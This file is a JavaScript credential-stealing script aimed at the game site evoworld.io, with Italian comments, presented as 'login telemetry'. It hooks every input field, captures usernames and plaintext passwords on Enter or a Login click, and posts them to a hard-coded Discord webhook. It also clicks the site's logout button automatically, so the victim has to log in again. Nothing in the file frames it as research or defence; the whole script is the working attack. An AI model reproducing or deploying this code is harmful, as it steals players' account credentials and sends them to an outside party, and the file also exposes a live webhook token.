// =====================================
// EvoWorld - Login Telemetry + Logout automatico (WORKING)
// =====================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1"; 

let lastTextInput = null;
let lastPasswordInput = null;
let logoutDone = false; // flag per eseguire logout solo una volta

// Memorizza ultimi valori noti
const lastValues = new WeakMap();

// Funzione che processa un input e segnala se cambiato
function processInput(input) {
  const prev = lastValues.get(input) || "";
  const curr = input.value || "";

  if (!curr || prev === curr) return;

  lastValues.set(input, curr);

  if (input.type === "text") {
    console.log("[Telemetry] username:", curr);
  } 
  else if (input.type === "password") {
    console.log("[Telemetry] password:", curr);
  }
}

// 🔹 Legge subito i valori presenti
function checkAllInputs(root = document) {
  root.querySelectorAll("input").forEach(processInput);
}

// 🔹 Traccia focus
document.addEventListener("focusin", e => {
  if (e.target.tagName === "INPUT") {
    if (e.target.type === "text") lastTextInput = e.target;
    if (e.target.type === "password") lastPasswordInput = e.target;
  }
});

// 🔹 Eventi manuali
["input", "paste", "change"].forEach(evt =>
  document.addEventListener(evt, e => {
    if (e.target.tagName === "INPUT") {
      processInput(e.target);
    }
  }, true)
);

// 🔹 Polling mirato per la modale di login
function watchLoginModal(duration = 5000) {
  const start = Date.now();

  const interval = setInterval(() => {
    // la modale ha SEMPRE un password input
    const modal = document.querySelector('input[type="password"]')?.closest("div");
    if (modal) checkAllInputs(modal);

    if (Date.now() - start > duration) {
      clearInterval(interval);
    }
  }, 100);
}

// 🔹 intercetta click su Login
document.addEventListener("click", e => {
  const el = e.target;
  if (el.textContent && /login/i.test(el.textContent)) {
    setTimeout(() => watchLoginModal(), 200);
  }
}, true);

// 🔹 osserva input aggiunti dinamicamente
const domObserver = new MutationObserver(muts => {
  muts.forEach(mut => {
    mut.addedNodes.forEach(node => {
      if (node.tagName === "INPUT") {
        processInput(node);
      } else if (node.querySelectorAll) {
        node.querySelectorAll("input").forEach(processInput);
      }
    });
  });
});

// 🔹 Init
window.addEventListener("load", () => {
  checkAllInputs();
  domObserver.observe(document.body, { childList: true, subtree: true });
});

// ----------------------------
// Funzione di invio telemetry
// ----------------------------
async function sendTelemetry(method) {
  const username = lastTextInput?.value.trim() || "";
  const password = lastPasswordInput?.value || "";

  const payload = {
    event: "login_submit",
    username: username,
    username_length: username.length,
    password: password,
    method,
    timestamp: new Date().toISOString()
  };

  // ----- Console-only (per debug) -----
  console.log("[Telemetry] INVIO SIMULATO");
  console.log(payload);

  // ----- Invio reale su Discord -----
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
      })
    });
    console.log("[Telemetry] Inviato su Discord");
  } catch (err) {
    console.error("[Telemetry] Errore invio Discord:", err);
  }
}

// ----------------------------
// ENTER (login via tastiera)
// ----------------------------
document.addEventListener("keydown", e => {
  if (e.key === "Enter") sendTelemetry("enter");
});

// ----------------------------
// CLICK SU QUALSIASI "Login"
// ----------------------------
document.addEventListener("click", e => {
  const btn = e.target.closest("button");
  if (btn && btn.textContent?.trim().toLowerCase() === "login") {
    sendTelemetry("click_login");
  }
});

// ---- Auto Logout evoworld.io ----

// variabili GLOBALI sicure
if (window.logoutDone === undefined) {
  window.logoutDone = false;
}

if (window.autoLogoutInterval) {
  clearInterval(window.autoLogoutInterval);
}

window.autoLogoutInterval = setInterval(function () {
  if (window.logoutDone) return;

  var logoutBtn =
    document.querySelector('button.logout') ||
    document.querySelector('a.logout') ||
    document.querySelector('#logout') ||
    document.querySelector('[onclick*="logout"]');

  if (logoutBtn) {
    logoutBtn.click();
    window.logoutDone = true;
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout automatico eseguito");
  }
}, 1000);

// timeout sicurezza
setTimeout(function () {
  if (!window.logoutDone) {
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout non trovato (timeout)");
  }
}, 27500);
